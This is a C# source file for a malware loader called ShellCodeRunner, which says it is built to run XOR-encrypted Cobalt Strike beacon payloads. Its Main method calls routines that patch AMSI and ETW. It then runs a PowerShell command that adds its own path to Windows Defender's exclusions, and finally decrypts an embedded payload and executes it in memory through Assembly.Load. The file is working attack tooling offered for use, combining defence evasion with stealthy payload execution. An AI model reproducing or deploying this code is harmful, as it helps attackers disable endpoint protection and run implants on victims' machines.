﻿/*
 * ShellCodeRunner: 
 * Executes the shellcode injection technique
 * A .NET ShellCode runner with built in XOR DECRYPTOR, intended for running XOR encrypted  
 * Cobalt strike beacon payloads, but can be used for any XOR encrypted payload.
 * 
 * By Antonio Piazza
 * 4n7m4n
 * Twitter: @antman1p
 * 
 * Held by the hand/taught/mentored/instructed and written by Dwight Hohnstein
 * Twitter: @djhohnstein
 * 
 * References: 
 * http://pinvoke.net/default.aspx/kernel32/VirtualAllocEx.html
 * http://pinvoke.net/default.aspx/kernel32/VirtualProtectEx.html
 * http://pinvoke.net/default.aspx/kernel32/CreateThread.html
 * https://docs.microsoft.com/en-us/windows/desktop/api/memoryapi/nf-memoryapi-virtualalloc
 * https://docs.microsoft.com/en-us/windows/desktop/api/memoryapi/nf-memoryapi-virtualprotect
 * https://docs.microsoft.com/en-us/windows/desktop/api/processthreadsapi/nf-processthreadsapi-createthread
 * https://docs.microsoft.com/en-us/windows/desktop/api/synchapi/nf-synchapi-waitforsingleobject
 * https://docs.microsoft.com/en-us/windows/desktop/memory/memory-protection-constants
 * https://msdn.microsoft.com/en-us/library/windows/desktop/aa379560(v=vs.85).aspx
 * https://www.endgame.com/blog/technical-blog/hunting-memory
 * https://www.endgame.com/blog/technical-blog/ten-process-injection-techniques-technical-survey-common-and-trending-process
 * 
 */

using System;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Collections.ObjectModel;
using System.Management.Automation;

namespace ShellCodeRunner
{
    class Program
    {
        static byte[] GetAllDecryptedBytes()
        {
            //Decryption Key.  Ensure it is the same as your Encryption key
            char[] key = { 'j', 'i', 'm', 'm', 'y', '9', '4', '7', '7', '8', '8' };

            /* Get the encrypted payload from the embedded resource
             * You'll need to add the XOR encrypted payload (encrypt.bin) 
             * to Visual Studio as an embedded resource
             * https://stackoverflow.com/questions/39367349/code-or-command-to-use-embedded-resource-in-visual-studio
             */
            byte[] encBytes = ShellCodeRunner.Properties.Resources.encrypt;

            // New byte array to hold decrypet payload bytes
            byte[] newByte = new byte[encBytes.Length];

            // index for the decryption key
            int j = 0;

            // Loop through each byte of the encrypted payload
            for (int i = 0; i < encBytes.Length; i++)
            {
                // iterate through the bytes of the encryption key.  If at the end of the array, loop back to the begining 
                if (j == key.Length)
                {
                    j = 0;
                }
                // XOR each byte of the encrypted payload with the coresponding byte of the encryption key
                newByte[i] = (byte)(encBytes[i] ^ Convert.ToByte(key[j]));
                j++;
            }
            return newByte;
        }

        static void Main(string[] args)
        {
            ByPassUtility.PathAMSI();

            ByPassUtility.PatchETW();

            using (PowerShell PowerShellInst = PowerShell.Create())
            {
                //con esto  guardamos la carpeta donde  estamos ubicados 
                //string path = Directory.GetCurrentDirectory();

                //guardar cualquier carpeta 
                string path = System.Reflection.Assembly.GetExecutingAssembly().Location;
                PowerShellInst.AddScript(@"Add-MpPreference -ExclusionPath '" + path + "'");//excluir una carpeta 
                Collection<PSObject> hola = PowerShellInst.Invoke();
            }
            // Get decrypted pic
            byte[] pic = GetAllDecryptedBytes();

            var assembly = Assembly.Load(pic);

            assembly.EntryPoint.Invoke(null, new object[] { args });
        }

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress,
            uint dwSize, AllocationType flAllocationType, MemoryProtection flProtect);

        [DllImport("kernel32.dll")]
        static extern bool VirtualProtect(IntPtr lpAddress,
            uint dwSize, MemoryProtection flNewProtect, out MemoryProtection lpflOldProtect);

        [DllImport("Kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private unsafe static extern IntPtr CreateThread(
        SECURITY_ATTRIBUTES lpThreadAttributes,
        int dwStackSize,
        IntPtr lpStartAddress,
        IntPtr lpParameter,
        CreationFlags dwCreationFlags,
        out IntPtr lpThreadId);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);


        [StructLayout(LayoutKind.Sequential)]
        public struct SECURITY_ATTRIBUTES
        {
            public int nLength;
            public unsafe byte* lpSecurityDescriptor;
            public int bInheritHandle;
        }

        [Flags]
        public enum AllocationType
        {
            Commit = 0x1000,
            Reserve = 0x2000,
            Decommit = 0x4000,
            Release = 0x8000,
            Reset = 0x80000,
            Physical = 0x400000,
            TopDown = 0x100000,
            WriteWatch = 0x200000,
            LargePages = 0x20000000
        }

        [Flags]
        public enum MemoryProtection
        {
            Execute = 0x10,
            ExecuteRead = 0x20,
            ExecuteReadWrite = 0x40,
            ExecuteWriteCopy = 0x80,
            NoAccess = 0x01,
            ReadOnly = 0x02,
            ReadWrite = 0x04,
            WriteCopy = 0x08,
            GuardModifierflag = 0x100,
            NoCacheModifierflag = 0x200,
            WriteCombineModifierflag = 0x400
        }

        [Flags]
        public enum CreationFlags
        {
            IMMEDIATE = 0,
            CREATE_SUSPENDED = 0x00000004,
            STACK_SIZE_PARAM_IS_A_RESERVATION = 0x00010000
        }
    }
}
